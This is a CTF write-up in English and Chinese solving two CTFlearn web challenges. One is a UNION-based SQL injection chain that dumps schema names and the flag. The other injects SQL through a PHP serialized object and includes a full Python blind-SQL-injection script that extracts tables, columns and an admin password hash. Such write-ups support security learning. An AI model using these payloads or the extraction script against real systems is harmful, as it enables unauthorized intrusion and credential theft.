# CTF SR 23.4.30.md

## CTFlearn Inj3ction Time

I stumbled upon this website: <http://web.ctflearn.com/web8/> and I think they have the flag in their somewhere. UNION might be a helpful command
  
`https://web.ctflearn.com/web8/?id=1`  
`https://web.ctflearn.com/web8/?id=1 order by 4`  
`https://web.ctflearn.com/web8/?id=-1 union select group_concat(schema_name),2,3,4 from information_schema.schemata`  
got information_schema,webeight  
`https://web.ctflearn.com/web8/?id=-1 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=database()`  
got w0w_y0u_f0und_m3,webeight  
`https://web.ctflearn.com/web8/?id=-1 union select group_concat(column_name),2,3,4 from information_schema.columns where table_schema=database()`  
got f0und_m3,breed,name,color,id  
`https://web.ctflearn.com/web8/?id=-1 union select group_concat(column_name),2,3,4 from information_schema.columns where table_schema=database() and table_name="w0w_y0u_f0und_m3"`  
没有结果，可能是过滤了引号，但是基本可以确定 f0und_m3 字段位于 w0w_y0u_f0und_m3  
`https://web.ctflearn.com/web8/?id=-1 union select group_concat(f0und_m3),2,3,4 from w0w_y0u_f0und_m3`  
abctf{uni0n_1s_4_gr34t_c0mm4nd}  

## CTFlearn Grid It!

Can you bypass the security measures on the site and find the flag? I doubt it. <http://web.ctflearn.com/grid>  

try delete a point

```http
GET /grid/controller.php?action=delete_point&point=O:5:"point":3:{s:1:"x";s:1:"1";s:1:"y";s:1:"1";s:2:"ID";s:7:"3036224";}
```

### serialize

(PHP 4, PHP 5, PHP 7, PHP 8)

serialize — Generates a storable representation of a value

### Description

serialize(mixed $value): string
Generates a storable representation of a value.

This is useful for storing or passing PHP values around without losing their type and structure.

To make the serialized string into a PHP value again, use unserialize().
> <https://www.php.net/manual/en/function.serialize.php>

Booleans `b:<i>;` where `<i>` is an integer with a value of either 0 (false) or 1 (true).  
Integers `i:<i>;` where `<i>` is the integer value.  
Floats `d:<f>;` where `<f>` is the float value.  
Strings `s:<i>:"<s>";`  
Objects are serialized as:
`O:<i>:"<s>":<i>:{<properties>}`  
`<properties>` are zero or more serialized name value pairs:

> <https://stackoverflow.com/questions/14297926/structure-of-a-serialized-php-string>
<https://www.phpinternalsbook.com/php5/classes_objects/serialization.html>

so `O:5:"point":3:{s:1:"x";s:1:"1";s:1:"y";s:1:"1";s:2:"ID";s:7:"3036224";}` ->

```txt
point
(
    [x] => 1
    [y] => 1
    [ID] => 3036224
)
```

try a simple SQL injection:

```http
GET /grid/controller.php?action=delete_point&point=O:5:"point":3:{s:1:"x";s:1:"1";s:1:"y";s:1:"1";s:2:"ID";s:12:"3036224 OR 1";}
```

all points were deleted. 说明 ID 字段存在 SQL 注入，无回显使用盲注。  

<https://github.com/terjanq/Flag-Capture/tree/master/Practice/CTFLearn/GridIt#grid-it---write-up-by-terjanq>

```py
import requests, urllib, re, sys

url_base = "http://web.ctflearn.com/grid/controller.php"
url_login= url_base+"?action=login"
url_debug= url_base+"?action=debug"
url_delete= url_base+"?action=delete_point&point="
url_addpoint = url_base+"?action=add_point"

sessid = requests.Session()

payload_base = 'O:5:"point":1:{s:2:"ID";s:@LENGTH@:"@QUERY@";};'
init_array = []
sillent = False
fancy_console = False

ASCIIAlphabet = "\001 !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
simpleAlphabet = "\001abcdefghijklmnopqrstuvwxyz"
HEXAlphabet = "\0010123456789abcdef"
advancedAlphabet= "\0010123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"

admin_hash_payload = "@ID@ AND Ascii(substring((SELECT password FROM user WHERE username='admin' LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@"
tables_payload = "@ID@ AND Ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@"
columns_user_payload = "@ID@ AND Ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'user' LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@"
columns_point_payload = "@ID@ AND Ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'point' LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@"

def printInPlace(alert):
    if fancy_console:
        sys.stdout.write("{}{}".format(alert, "\b"*len(alert)))
        sys.stdout.flush();
    return fancy_console

def isLogged():
    debug = sessid.get(url_debug)
    i = debug.text.find("[user]")
    return False if i==-1 else True

def createPayload( query ):
    return payload_base.replace("@LENGTH@", str(len(query))).replace("@QUERY@", query)

def sendPayload ( query ):
    if sillent == False: print ("exec: WHERE ID= {}".format(query))
    payload = createPayload(query)
    delete = sessid.get(url_delete+payload)
    return findIDs(delete.text)

def logIn(login_info):
    print ("loggin in: ", login_info)
    sessid.post(url_login, data=login_info, allow_redirects=False)
    return

def findIDs(text):
    regex = re.compile(r"ID:\s(\d{6})")
    matches = regex.findall(text)
    return matches

def addPoints():
    alert = "      [[Adding points]]"
    if printInPlace(alert) == False and sillent == False: 
        print("[[Adding points]]")
    for x in range(1, 30):
        point = {'x': 0, 'y': 0}
        sessid.post(url_addpoint, data=point, allow_redirects=False)
    printInPlace(" "*len(alert))
    return

def tryPayload(str):
    global init_array
    if(len(init_array) <= 1):
        addPoints()
        init_array = sendPayload("1")
    oldLen = len(init_array)
    init_array = sendPayload(str)
    return oldLen != len(init_array)

#bin-search ASCII inside [alphabet]
def findName(payload, alphabet):
    a = 0
    b = len(alphabet)-1
    while (a < b):
        mid = (a+b)//2
        c = alphabet[mid]
        printInPlace(c)
        if tryPayload(payload
            .replace("@cORD@", str(ord(c)))
            .replace("@ID@", str(init_array[0]))
            ): a = mid + 1
        else:
            b = mid
    return alphabet[a]


def findNames(payload, alphabet):
    for result_offset in range(0, 10):
        result = ""
        pl = payload.replace("@rOFFSET@", str(result_offset))
        for word_offset in range(1, 40):
            pl2 = pl.replace("@wOFFSET@", str(word_offset))
            c = findName(pl2, alphabet)
            if c == alphabet[0]: break
            sys.stdout.write(c)
            sys.stdout.flush
            result+=c
        print(" ")
        if len(result) <= 1: break
    return


def findTables():
    print ("..:: Searching for table names ::..")
    findNames(tables_payload, advancedAlphabet)

def findUserColumns():
    print ("..:: Searching for column names in user ::..")
    findNames(columns_user_payload, advancedAlphabet)

def findPointColumns():
    print ("..:: Searching for column names in point::..")
    findNames(columns_point_payload, advancedAlphabet)


def findAdminHash():
    print ("..:: Searching for Admin hash ::..")
    findNames(admin_hash_payload, HEXAlphabet)


def deletePoints():
    sendPayload("1 OR 1")
    exit(0)



fancy_console = True # Turn on fancy terminal output
sillent = True # Turn off debugging mode
logIn({'uname': 'writeup', 'pass': 'writeup'})


if isLogged():
    print("Sucessfully logged in")
else:
    exit("Unsuccessful login!")


#deletePoints();
#addPoints();
init_array = sendPayload("1");

findTables();
findPointColumns();
findUserColumns();
findAdminHash();
```
